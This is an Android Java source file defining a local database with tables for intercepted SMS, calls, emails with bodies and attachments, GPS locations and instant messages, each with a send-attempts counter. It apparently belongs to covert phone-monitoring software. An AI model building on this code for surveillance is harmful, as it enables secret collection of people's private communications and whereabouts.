package com.fx.eventdb;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

import com.fx.maind.ref.MainDaemonResource;
import com.vvt.database.VtDatabase;
import com.vvt.logger.FxLog;

class EventDatabase extends VtDatabase {
	
	private static final String TAG = "EventDatabase";
	private static final String DATABASE_NAME = EventDatabaseMetadata.DB_NAME;
    private static EventDatabase sInstance;
    
    public static EventDatabase getInstance() {
    	if (sInstance == null) {
    		sInstance = new EventDatabase();
    	}
    	return sInstance;
    }
    
    private EventDatabase() { }
	
    @Override
	protected void createTables() {
    	String systemPath = getDatabasePath();
		SQLiteDatabase db = null;
		
		try {
			db = SQLiteDatabase.openOrCreateDatabase(systemPath, null);
			createSmsLogEventTable(db);
			createCallLogEventTable(db);
			createEmailEventTable(db);
			createLocationLogEventTable(db);
			createImEventTable(db);
			createSystemLogEventTable(db);
		}
		catch (SQLiteException e) {
			FxLog.e(TAG, String.format("createTables # Error: %s", e));
		}
		finally {
			if (db != null) {
				db.close();
			}
		}
	}
    
    @Override
	protected void deleteTables() {
		SQLiteDatabase db = getWritableDatabase();
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.Sms.TABLE_NAME));
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.Call.TABLE_NAME));
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.Email.TABLE_NAME));
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.Location.TABLE_NAME));
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.IM.TABLE_NAME));
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.System.TABLE_NAME));
		db.close();
	}
    
    @Override
	protected String getDebugTag() {
		return TAG;
	}
	
	@Override
	protected String getFolderName() {
		return MainDaemonResource.EXTRACTING_PATH;
	}
	
	@Override
	protected String getFilename() {
		return DATABASE_NAME;
	}
    
    private void createSmsLogEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s TEXT, " +
				"%6$s NUMERIC, " +
				"%7$s TEXT, " +
				"%8$s TEXT, " +
				"%9$s TEXT);"
				, EventDatabaseMetadata.Sms.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.Sms.TIME // 5
				, EventDatabaseMetadata.Sms.DIRECTION // 6
				, EventDatabaseMetadata.Sms.PHONENUMBER // 7
				, EventDatabaseMetadata.Sms.DATA // 8
				, EventDatabaseMetadata.Sms.CONTACT_NAME); // 9
		db.execSQL(sql);
	}
    
    private void createCallLogEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s TEXT, " +
				"%6$s TEXT, " +
				"%7$s NUMERIC, " +
				"%8$s NUMERIC, " +
				"%9$s TEXT, " +
				"%10$s TEXT, " +
				"%11$s NUMERIC, " +
				"%12$s TEXT);"
				, EventDatabaseMetadata.Call.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.Call.PHONENUMBER // 5
				, EventDatabaseMetadata.Call.TIME_INITIATED // 6
				, EventDatabaseMetadata.Call.DURATION_SECONDS // 7
				, EventDatabaseMetadata.Call.DIRECTION // 8
				, EventDatabaseMetadata.Call.TIME_CONNECTED // 9
				, EventDatabaseMetadata.Call.TIME_TERMINATED // 10
				, EventDatabaseMetadata.Call.STATUS // 11
				, EventDatabaseMetadata.Call.CONTACT_NAME); // 12
		db.execSQL(sql);
	}
    
    private void createEmailEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s TEXT, " +
				"%6$s NUMERIC, " +
				"%7$s NUMERIC, " +
				"%8$s TEXT, " +
				"%9$s TEXT, " +
				"%10$s TEXT, " +
				"%11$s TEXT, " +
				"%12$s TEXT, " +
				"%13$s TEXT, " +
				"%14$s TEXT, " +
				"%15$s TEXT);"
				, EventDatabaseMetadata.Email.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.Email.TIME //5
				, EventDatabaseMetadata.Email.DIRECTION //6
				, EventDatabaseMetadata.Email.SIZE //7
				, EventDatabaseMetadata.Email.SENDER //8
				, EventDatabaseMetadata.Email.TO //9
				, EventDatabaseMetadata.Email.CC //10
				, EventDatabaseMetadata.Email.BCC //11
				, EventDatabaseMetadata.Email.SUBJECT //12
				, EventDatabaseMetadata.Email.ATTACHMENTS //13
				, EventDatabaseMetadata.Email.BODY //14
				, EventDatabaseMetadata.Email.CONTACT_NAME);  //15
		db.execSQL(sql);
	}
	
	private void createLocationLogEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s TEXT, " +
				"%6$s REAL, " +
				"%7$s REAL, " +
				"%8$s REAL, " +
				"%9$s REAL, " +
				"%10$s REAL, " +
				"%11$s TEXT);"
				, EventDatabaseMetadata.Location.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.Location.TIME // 5
				, EventDatabaseMetadata.Location.LATITUDE // 6
				, EventDatabaseMetadata.Location.LONGITUDE // 7
				, EventDatabaseMetadata.Location.ALTITUDE // 8
				, EventDatabaseMetadata.Location.HORIZONTAL_ACCURACY // 9
				, EventDatabaseMetadata.Location.VERTICAL_ACCURACY
				, EventDatabaseMetadata.Location.PROVIDER); // 10
		db.execSQL(sql);
	}
	
	private void createImEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s TEXT, " +
				"%6$s NUMERIC, " +
				"%7$s TEXT, " +
				"%8$s TEXT, " +
				"%9$s TEXT, " +
				"%10$s TEXT, " +
				"%11$s TEXT, " +
				"%12$s TEXT);"
				, EventDatabaseMetadata.IM.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.IM.TIME //5
				, EventDatabaseMetadata.IM.DIRECTION //6
				, EventDatabaseMetadata.IM.SERVICE //7
				, EventDatabaseMetadata.IM.USERNAME //8
				, EventDatabaseMetadata.IM.SPEAKER_NAME //9
				, EventDatabaseMetadata.IM.PARTICIPANT_UIDS //10
				, EventDatabaseMetadata.IM.PARTICIPANT_NAMES //11
				, EventDatabaseMetadata.IM.DATA);  //12
		db.execSQL(sql);
	}
	
	private void createSystemLogEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s TEXT, " +
				"%6$s NUMERIC, " +
				"%7$s TEXT);"
				, EventDatabaseMetadata.System.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.System.TIME // 5
				, EventDatabaseMetadata.System.DIRECTION // 6
				, EventDatabaseMetadata.System.DATA); // 7
		db.execSQL(sql);
	}

}
